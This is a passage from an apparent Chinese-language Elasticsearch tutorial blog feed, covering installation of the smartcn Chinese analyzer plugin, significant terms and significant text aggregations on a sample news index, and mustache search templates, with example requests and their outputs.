    <content type="text"><![CDATA[Smart Chinese Analysis插件将Lucene的Smart Chinese分析模块集成到Elasticsearch中，用于分析中文或中英文混合文本。 支持的分析器在大型训练语料库上使用基于隐马尔可夫（Markov）模型的概率知识来查找简体中文文本的最佳分词。 它使用的策略是首先将输入文本分解为句子，然后对句子进行切分以获得单词。 该插件提供了一个称为smartcn分析器的分析器，以及一个称为smartcn_tokenizer的标记器。 请注意，两者均不能使用任何参数进行配置。要将smartcn Analysis插件安装在Elasticsearch Docker容器中，请使用以下屏幕截图中显示的命令。 然后，我们重新启动容器以使插件生效：1./bin/elasticsearch-plugin install analysis-smartcn在Elasticsearch的安装目录运行上面的命令。显示的结果如下：1234567891011121314$ ./bin/elasticsearch-plugin install analysis-smartcn-&gt; Downloading analysis-smartcn from elastic[=================================================] 100% WARNING: An illegal reflective access operation has occurredWARNING: Illegal reflective access by org.bouncycastle.jcajce.provider.drbg.DRBG (file:/Users/liuxg/elastic/elasticsearch-7.3.0/lib/tools/plugin-cli/bcprov-jdk15on-1.61.jar) to constructor sun.security.provider.Sun()WARNING: Please consider reporting this to the maintainers of org.bouncycastle.jcajce.provider.drbg.DRBGWARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operationsWARNING: All illegal access operations will be denied in a future release-&gt; Installed analysis-smartcn(base) localhost:elasticsearch-7.3.0 liuxg$ ./bin/elasticsearch-plugin listanalysis-icuanalysis-ikanalysis-smartcnpinyin上面显示我们已经成功地把analysis-smartcn安装成功了。针对docker的安装，我们可以通过如下的命令来进入到docker里，再进行安装：12345$ docker exec -it es01 /bin/bash[root@ec4d19f59a7d elasticsearch]# lsLICENSE.txt README.textile config jdk logs pluginsNOTICE.txt bin data lib modules[root@ec4d19f59a7d elasticsearch]#在这里es01是docker中的Elasticsearch实例。具体安装请参阅我的文章“Elastic：用Docker部署Elastic栈”。注意：在我们安装好smartcn分析器后，我们必须重新启动Elasticsearch使它开始起作用。实例在下面，我们在Kibana中用一个实例来展示这个用法：12345POST _analyze &#123; &quot;text&quot;: &quot;股市，投资，稳，赚，不，赔，必修课，如何，做，好，仓，位，管理，和，情绪，管理&quot;, &quot;analyzer&quot;: &quot;smartcn&quot;&#125;显示结果：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116&#123; &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;股市&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 2, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;投资&quot;, &quot;start_offset&quot; : 3, &quot;end_offset&quot; : 5, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 2 &#125;, &#123; &quot;token&quot; : &quot;稳&quot;, &quot;start_offset&quot; : 6, &quot;end_offset&quot; : 7, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 4 &#125;, &#123; &quot;token&quot; : &quot;赚&quot;, &quot;start_offset&quot; : 8, &quot;end_offset&quot; : 9, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 6 &#125;, &#123; &quot;token&quot; : &quot;不&quot;, &quot;start_offset&quot; : 10, &quot;end_offset&quot; : 11, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 8 &#125;, &#123; &quot;token&quot; : &quot;赔&quot;, &quot;start_offset&quot; : 12, &quot;end_offset&quot; : 13, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 10 &#125;, &#123; &quot;token&quot; : &quot;必修课&quot;, &quot;start_offset&quot; : 14, &quot;end_offset&quot; : 17, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 12 &#125;, &#123; &quot;token&quot; : &quot;如何&quot;, &quot;start_offset&quot; : 18, &quot;end_offset&quot; : 20, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 14 &#125;, &#123; &quot;token&quot; : &quot;做&quot;, &quot;start_offset&quot; : 21, &quot;end_offset&quot; : 22, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 16 &#125;, &#123; &quot;token&quot; : &quot;好&quot;, &quot;start_offset&quot; : 23, &quot;end_offset&quot; : 24, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 18 &#125;, &#123; &quot;token&quot; : &quot;仓&quot;, &quot;start_offset&quot; : 25, &quot;end_offset&quot; : 26, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 20 &#125;, &#123; &quot;token&quot; : &quot;位&quot;, &quot;start_offset&quot; : 27, &quot;end_offset&quot; : 28, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 22 &#125;, &#123; &quot;token&quot; : &quot;管理&quot;, &quot;start_offset&quot; : 29, &quot;end_offset&quot; : 31, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 24 &#125;, &#123; &quot;token&quot; : &quot;和&quot;, &quot;start_offset&quot; : 32, &quot;end_offset&quot; : 33, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 26 &#125;, &#123; &quot;token&quot; : &quot;情绪&quot;, &quot;start_offset&quot; : 34, &quot;end_offset&quot; : 36, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 28 &#125;, &#123; &quot;token&quot; : &quot;管理&quot;, &quot;start_offset&quot; : 37, &quot;end_offset&quot; : 39, &quot;type&quot; : &quot;word&quot;, &quot;position&quot; : 30 &#125; ]&#125;]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：significant terms aggregation]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9Asignificant%20terms%20aggregation%2F</url>
    <content type="text"><![CDATA[在本文中，我们将重点关注significant terms和significant text聚合。这些聚合旨在搜索数据集中有趣和/或不寻常的术语，这些术语可以告诉您有关数据的隐藏属性的更多信息。此功能对于以下用例特别有用：为用户查询标识包含同义词，首字母缩略词等的相关文档。例如，当用户搜索H1N1时，重要术语聚合可能会建议带有“bird flu”的文档。识别数据中的异常和有趣的事件。例如，通过基于位置过滤文档，我们可以确定特定区域中最常见的犯罪类型。使用对整数字段（例如身高，体重，收入等）的significant term聚合来确定一组主题的最重要属性。应当注意，重要术语和重要文本聚合都对直接查询（前景集）和索引中所有其他文档（背景集）检索的文档执行复杂的统计计算。因此，两种聚合都需要大量计算，因此应正确配置以快速工作。但是，一旦在本教程的帮助下掌握了它们，您将获得一个强大的工具，可以在应用程序中构建非常有用的功能并从数据集中获取有用的见解。让我们开始吧！在教程开始，我们假定您已经把Elasticsearch及Kibana完整地安装好了。创建Index mapping为了说明significant terms和significant text的工作方式，我们首先需要创建一个测试“news”索引来存储新闻文章的集合。 索引映射将包含诸如作者，出版日期，文章标题，视图数和主题之类的字段。 让我们创建映射：1234567891011121314151617181920212223PUT news&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;published&quot;: &#123; &quot;type&quot;: &quot;date&quot;, &quot;format&quot;: &quot;dateOptionalTime&quot; &#125;, &quot;author&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;, &quot;title&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125;, &quot;topic&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;, &quot;views&quot;: &#123; &quot;type&quot;: &quot;integer&quot; &#125; &#125; &#125;&#125;如您所见，我们在topic和author字段中使用了keyword数据类型，在title字段中使用了text数据类型。 提醒您，关键字字段只能按其确切值进行搜索，而文本字段可用于全文搜索。接下来，让我们使用Bulk API将一些任意新闻文档添加到索引中。123456789101112131415161718192021POST news/_bulk&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;news&quot;&#125;&#125;&#123;&quot;author&quot;:&quot;John Michael&quot;,&quot;published&quot;:&quot;2018-07-08&quot;,&quot;title&quot;:&quot;Tesla is flirting with its lowest close in over 1 1/2 years (TSLA)&quot;,&quot;topic&quot;:&quot;automobile&quot;,&quot;views&quot;:&quot;431&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;news&quot;&#125;&#125;&#123;&quot;author&quot;:&quot;John Michael&quot;,&quot;published&quot;:&quot;2018-07-22&quot;,&quot;title&quot;:&quot;Tesla to end up like Lehman Brothers (TSLA)&quot;,&quot;topic&quot;:&quot;automobile&quot;,&quot;views&quot;:&quot;1921&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;news&quot;&#125;&#125;&#123;&quot;author&quot;:&quot;John Michael&quot;,&quot;published&quot;:&quot;2018-07-29&quot;,&quot;title&quot;:&quot;Tesla (TSLA) official says that they are going to release a new self-driving car model in the coming year&quot;,&quot;topic&quot;:&quot;automobile&quot;,&quot;views&quot;:&quot;1849&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;news&quot;&#125;&#125;&#123;&quot;author&quot;:&quot;John Michael&quot;,&quot;published&quot;:&quot;2018-08-14&quot;,&quot;title&quot;:&quot;Five ways Tesla uses AI and Big Data&quot;,&quot;topic&quot;:&quot;ai&quot;,&quot;views&quot;:&quot;871&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;news&quot;&#125;&#125;&#123;&quot;author&quot;:&quot;John Michael&quot;,&quot;published&quot;:&quot;2018-08-14&quot;,&quot;title&quot;:&quot;Toyota partners with Tesla (TSLA) to improve the security of self-driving cars&quot;,&quot;topic&quot;:&quot;automobile&quot;,&quot;views&quot;:&quot;871&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;news&quot;&#125;&#125;&#123;&quot;author&quot;:&quot;Robert Cann&quot;,&quot;published&quot;:&quot;2018-08-25&quot;,&quot;title&quot;:&quot;Is AI dangerous for humanity&quot;,&quot;topic&quot;:&quot;ai&quot;,&quot;views&quot;:&quot;981&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;news&quot;&#125;&#125;&#123;&quot;author&quot;:&quot;Robert Cann&quot;,&quot;published&quot;:&quot;2018-09-13&quot;,&quot;title&quot;:&quot;Is AI dangerous for humanity&quot;,&quot;topic&quot;:&quot;ai&quot;,&quot;views&quot;:&quot;871&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;news&quot;&#125;&#125;&#123;&quot;author&quot;:&quot;Robert Cann&quot;,&quot;published&quot;:&quot;2018-09-27&quot;,&quot;title&quot;:&quot;Introduction to Generative Adversarial Networks (GANs) in self-driving cars&quot;,&quot;topic&quot;:&quot;automobile&quot;,&quot;views&quot;:&quot;1183&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;news&quot;&#125;&#125;&#123;&quot;author&quot;:&quot;Robert Cann&quot;,&quot;published&quot;:&quot;2018-10-09&quot;,&quot;title&quot;:&quot;Introduction to Natural Language Processing&quot;,&quot;topic&quot;:&quot;ai&quot;,&quot;views&quot;:&quot;786&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;news&quot;&#125;&#125;&#123;&quot;author&quot;:&quot;Robert Cann&quot;,&quot;published&quot;:&quot;2018-10-15&quot;,&quot;title&quot;:&quot;New Distant Objects Found in the Fight for Planet X &quot;,&quot;topic&quot;:&quot;astronomy&quot;,&quot;views&quot;:&quot;542&quot;&#125;在这里，我们共同插入了20条数据。Significant Terms Aggregation正如我们已经提到的，重要的术语聚合可以识别数据中异常和有趣的术语。 对于以下用例，聚合功能非常强大：识别与用户查询相关的相关术语/文档。 例如，当用户查询“Spain”时，聚合可能会建议诸如“Madrid”，“Corrida”之类的术语，或有关Spain的文档中常见的其他任何术语。Significant term聚合可用于自动新闻分类器，其中基于频繁连接的术语图对文档进行分类。发现数据中的异常。 例如，借助这种汇总，我们可以识别某些地理区域中的异常犯罪类型或疾病。重要的是要理解，significant terms聚合选择的术语不仅是文档集中最受欢迎的术语。 例如，即使首字母缩略词“ MSFT”仅存在于一千万个文档索引中的10个文档中，但如果在与用户查询“ Microsoft”相匹配的50个文档中有10个找到了这个MSFT，则它仍然是相关的。 该频率使acronym（比如MSFT）与用户的搜索相关。为了识别重要术语，聚合对与查询匹配的搜索结果以及从中收集结果的索引执行复杂的统计分析。 与查询直接匹配的搜索结果代表前景集，而从中检索它们的索引代表背景集。 重要术语聚合的任务是比较这些集合并找到最常与用户查询关联的术语。上面的意思可以用上面的一幅图来解释。比如上面的绿色代表一个很大的索引，它里面可能含有比如Nokia这个term很高的出现率。即便如此，只要我们所搜索的FG那个红色的结果里，它出现的几率非常低，也不能够出现在significant terms的聚合里。相反，如果一个term比如TECNO（中国一个非常出名的在非洲的品牌）出现我们所搜索的set里（比如搜索 africa phone），那么我们搜索的聚合将会是是TECNO尽管TECNO可能在整个BG所包含的文档里出现的几率非常之低。让我们使用真实示例，演示聚合如何工作。 在下面的示例中，我们将尝试在索引中查找每个author的重要topics。 为此，我们首先在author字段上使用术语“桶聚合(bucket aggregation)”。 您还记得，terms aggregation为找到索引的所有唯一术语（即author）构造了存储桶。 接下来，我们在“topics”字段上使用significant terms聚合，以找出每个author的最重要topic。 看一下下面的查询：123456789101112131415161718GET news/_search&#123; &quot;size&quot;: 0, &quot;aggregations&quot;: &#123; &quot;authors&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: &quot;author&quot; &#125;, &quot;aggregations&quot;: &#123; &quot;significant_topic_types&quot;: &#123; &quot;significant_terms&quot;: &#123; &quot;field&quot;: &quot;topic&quot; &#125; &#125; &#125; &#125; &#125;&#125;显示的结果为：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&#123; &quot;took&quot; : 1, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 20, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;authors&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 0, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;John Michael&quot;, &quot;doc_count&quot; : 10, &quot;significant_topic_types&quot; : &#123; &quot;doc_count&quot; : 10, &quot;bg_count&quot; : 20, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;automobile&quot;, &quot;doc_count&quot; : 8, &quot;score&quot; : 0.4800000000000001, &quot;bg_count&quot; : 10 &#125; ] &#125; &#125;, &#123; &quot;key&quot; : &quot;Robert Cann&quot;, &quot;doc_count&quot; : 10, &quot;significant_topic_types&quot; : &#123; &quot;doc_count&quot; : 10, &quot;bg_count&quot; : 20, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;ai&quot;, &quot;doc_count&quot; : 6, &quot;score&quot; : 0.2999999999999999, &quot;bg_count&quot; : 8 &#125; ] &#125; &#125; ] &#125; &#125;&#125;显然对于作者John Michael来说，在他所发表的书里automobile是最经常出现的词。共有8次，而bg_count是10。同样对于作者Robert Cann来说，在他发布的作品里，ai是最最经常出现的词，在他的8个作品中，有6词提到ai。可以断定他就是一个ai专家！针对上面的significant terms聚合查询，我们也可以通过如下的方法来查询针对某个作者（author）的聚合。12345678910111213141516GET news/_search&#123; &quot;size&quot;: 0, &quot;query&quot;: &#123; &quot;term&quot;: &#123; &quot;author&quot;: &quot;John Michael&quot; &#125; &#125;, &quot;aggregations&quot;: &#123; &quot;significant_topics&quot;: &#123; &quot;significant_terms&quot;: &#123; &quot;field&quot;: &quot;topic&quot; &#125; &#125; &#125;&#125;显示的结果为：1234567891011121314151617181920212223242526272829303132&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 10, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;significant_topics&quot; : &#123; &quot;doc_count&quot; : 10, &quot;bg_count&quot; : 20, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;automobile&quot;, &quot;doc_count&quot; : 8, &quot;score&quot; : 0.4800000000000001, &quot;bg_count&quot; : 10 &#125; ] &#125; &#125;&#125;这种表述更适合解释我们上面的那个BG和FG的图。针对significant text aggregation，基本它和significant terms aggregation非常相似，只是它作用于一个text字段而不是一个keyword字段。比如:12345678910111213141516GET news/_search&#123; &quot;size&quot;: 0, &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;title&quot;: &quot;Tesla ai&quot; &#125; &#125;, &quot;aggregations&quot;: &#123; &quot;significant_topics&quot;: &#123; &quot;significant_text&quot;: &#123; &quot;field&quot;: &quot;topic&quot; &#125; &#125; &#125;&#125;注意这里的title字段是text，它同时搜索Telsa及ai，再根据这两个词来进行聚合：1234567891011121314151617181920212223242526272829303132333435363738&#123; &quot;took&quot; : 1, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 14, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ ] &#125;, &quot;aggregations&quot; : &#123; &quot;significant_topics&quot; : &#123; &quot;doc_count&quot; : 14, &quot;bg_count&quot; : 20, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;automobile&quot;, &quot;doc_count&quot; : 8, &quot;score&quot; : 0.08163265306122446, &quot;bg_count&quot; : 10 &#125;, &#123; &quot;key&quot; : &quot;ai&quot;, &quot;doc_count&quot; : 6, &quot;score&quot; : 0.030612244897959134, &quot;bg_count&quot; : 8 &#125; ] &#125; &#125;&#125;参考：【1】significant terms aggregation(https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-bucket-significantterms-aggregation.html)【2】significant text aggregation(https://www.elastic.co/guide/en/elasticsearch/reference/master/search-aggregations-bucket-significanttext-aggregation.html)]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：search template]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9Asearch%20template%2F</url>
    <content type="text"><![CDATA[我们发现一些用户经常编写了一些非常冗长和复杂的查询 - 在很多情况下，相同的查询会一遍又一遍地执行，但是会有一些不同的值作为参数来查询。在这种情况下，我们觉得使用一个search template（搜索模板）来做这样的工作非常合适。搜索模板允许您使用可在执行时定义的参数定义查询。Search template的好处是：避免在多个地方重复代码更容易测试和执行您的查询在应用程序间共享查询允许用户只执行一些预定义的查询将搜索逻辑与应用程序逻辑分离定义一个Search template首先，我们来定义一个search template来看看它到底是什么东西。使用_scripts端点将模板存储在集群状态中。在search template中使用的语言叫做mustache。(http://mustache.github.io/mustache.5.html)12345678910111213POST _scripts/my_search_template&#123; &quot;script&quot;: &#123; &quot;lang&quot;: &quot;mustache&quot;, &quot;source&quot;: &#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;&#123;&#123;my_field&#125;&#125;&quot;: &quot;&#123;&#123;my_value&#125;&#125;&quot; &#125; &#125; &#125; &#125;&#125;在这里，我们定义了一个叫做my_search_template的search template。如果我们想更新这个search template，我们可以直接进行修改，然后再次运行上面的命令即可。在match的字段里，我们定义了两个参数：my_field及my_value。下面，我们来首先建立一个叫做twitter的数据库：12345678910111213141516171819202122232425262728293031PUT twitter/_doc/1&#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125; PUT twitter/_doc/2&#123; &quot;user&quot; : &quot;虹桥-老吴&quot;, &quot;message&quot; : &quot;好友来了都今天我生日，好友来了,什么 birthday happy 就成!&quot;, &quot;uid&quot; : 7, &quot;age&quot; : 90, &quot;city&quot; : &quot;上海&quot;, &quot;province&quot; : &quot;上海&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国上海市闵行区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;31.175927&quot;, &quot;lon&quot; : &quot;121.383328&quot; &#125;&#125;我们这里把上面的两个文档存于到twitter的index之中。我们现在可以使用我们刚才定义的search template来进行搜索：12345678GET twitter/_search/template&#123; &quot;id&quot;: &quot;my_search_template&quot;, &quot;params&quot;: &#123; &quot;my_field&quot;: &quot;city&quot;, &quot;my_value&quot;: &quot;北京&quot; &#125;&#125;显示的结果是：123456789101112131415161718192021222324252627282930313233343536373839&#123; &quot;took&quot; : 1, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.9808292, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.9808292, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125; &#125; ] &#125;&#125;显示它只显示了我们的city为北京的一个文档，另外一个上海的文档没有做任何的显示。说明我们定义的search template是工作的。条件判断在Mustache语言中，它没有if/else这样的判断，但是你可以定section来跳过它如果那个变量是false还是没有被定义：123&#123;&#123;#param1&#125;&#125; &quot;This section is skipped if param1 is null or false&quot;&#123;&#123;/param1&#125;&#125;我们定义如下的一个search template:1234567891011121314151617181920212223242526272829303132POST _scripts/docs_from_beijing_and_age&#123; &quot;script&quot;: &#123; &quot;lang&quot;: &quot;mustache&quot;, &quot;source&quot;: &quot;&quot;&quot; &#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;must&quot;: [ &#123; &quot;match&quot;: &#123; &quot;city&quot;: &quot;&#123;&#123;search_term&#125;&#125;&quot; &#125; &#125; &#123;&#123;#search_age&#125;&#125; , &#123; &quot;range&quot;: &#123; &quot;age&quot;: &#123; &quot;gte&quot;: &#123;&#123;search_age&#125;&#125; &#125; &#125; &#125; &#123;&#123;/search_age&#125;&#125; ] &#125; &#125; &#125;&quot;&quot;&quot; &#125;&#125;在这里，我们同时定义了两个变量：search_term及search_age。针对search_age，我们做了一个判断，如果它有定义，及做一个range的查询。如果没有定义，就只用search_term。那么我们来做如下的实验：1234567GET twitter/_search/template&#123; &quot;id&quot;: &quot;docs_from_beijing_and_age&quot;, &quot;params&quot;: &#123; &quot;search_term&quot;: &quot;北京&quot; &#125;&#125;显示的结果是：123456789101112131415161718192021222324252627282930313233343536373839&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.9808292, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.9808292, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125; &#125; ] &#125;&#125;显然，city为北京的文档已经被搜索到了。如果我们做如下的查询：12345678GET twitter/_search/template&#123; &quot;id&quot;: &quot;docs_from_beijing_and_age&quot;, &quot;params&quot;: &#123; &quot;search_term&quot;: &quot;北京&quot;, &quot;search_age&quot;: &quot;30&quot; &#125;&#125;我们将搜索不到任何的结果，这是因为在这次查询中search_age已经被启用，而且在数据库中没有一个文档是来自“北京”，并且年龄大于30的。我们可以做如下的查询：12345678GET twitter/_search/template&#123; &quot;id&quot;: &quot;docs_from_beijing_and_age&quot;, &quot;params&quot;: &#123; &quot;search_term&quot;: &quot;北京&quot;, &quot;search_age&quot;: &quot;20&quot; &#125;&#125;那么这次的显示结果为：123456789101112131415161718192021222324252627282930313233343536373839&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.9808292, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.9808292, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125; &#125; ] &#125;&#125;显然这次我们搜索到我们想要的结果。查询search template1GET _scripts/&lt;templateid&gt;针对我们的情况：1GET _scripts/docs_from_beijing_and_age显示的结果为：1234567891011121314151617181920212223242526272829303132&#123; &quot;_id&quot; : &quot;docs_from_beijing_and_age&quot;, &quot;found&quot; : true, &quot;script&quot; : &#123; &quot;lang&quot; : &quot;mustache&quot;, &quot;source&quot; : &quot;&quot;&quot; &#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;must&quot;: [ &#123; &quot;match&quot;: &#123; &quot;city&quot;: &quot;&#123;&#123;search_term&#125;&#125;&quot; &#125; &#125; &#123;&#123;#search_age&#125;&#125; , &#123; &quot;range&quot;: &#123; &quot;age&quot;: &#123; &quot;gte&quot;: &#123;&#123;search_age&#125;&#125; &#125; &#125; &#125; &#123;&#123;/search_age&#125;&#125; ] &#125; &#125; &#125;&quot;&quot;&quot; &#125;&#125;这个正是我们之前定义的一个search template。删除一个search template我们可以通过如下的命令来删除一个已经创建的search template:1DELETE _scripts/&lt;templateid&gt;验证search template我们可以通过_render端点来验证我们的search template。比如：1234567891011121314151617181920212223242526272829303132GET _render/template&#123; &quot;source&quot;: &quot;&quot;&quot; &#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;must&quot;: [ &#123; &quot;match&quot;: &#123; &quot;city&quot;: &quot;&#123;&#123;search_term&#125;&#125;&quot; &#125; &#125; &#123;&#123;#search_age&#125;&#125; , &#123; &quot;range&quot;: &#123; &quot;age&quot;: &#123; &quot;gte&quot;: &#123;&#123;search_age&#125;&#125; &#125; &#125; &#125; &#123;&#123;/search_age&#125;&#125; ] &#125; &#125; &#125;&quot;&quot;&quot;, &quot;params&quot;: &#123; &quot;search_term&quot;: &quot;北京&quot;, &quot;search_age&quot;: &quot;20&quot; &#125;&#125;那么显示的结果是：12345678910111213141516171819202122&#123; &quot;template_output&quot; : &#123; &quot;query&quot; : &#123; &quot;bool&quot; : &#123; &quot;must&quot; : [ &#123; &quot;match&quot; : &#123; &quot;city&quot; : &quot;北京&quot; &#125; &#125;, &#123; &quot;range&quot; : &#123; &quot;age&quot; : &#123; &quot;gte&quot; : 20 &#125; &#125; &#125; ] &#125; &#125; &#125;&#125;显然，这个就是我们想要的结果。参考：【1】https://www.elastic.co/guide/en/elasticsearch/reference/7.4/search-template.html]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：Pinyin 分词器]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9APinyin%20%E5%88%86%E8%AF%8D%E5%99%A8%2F</url>
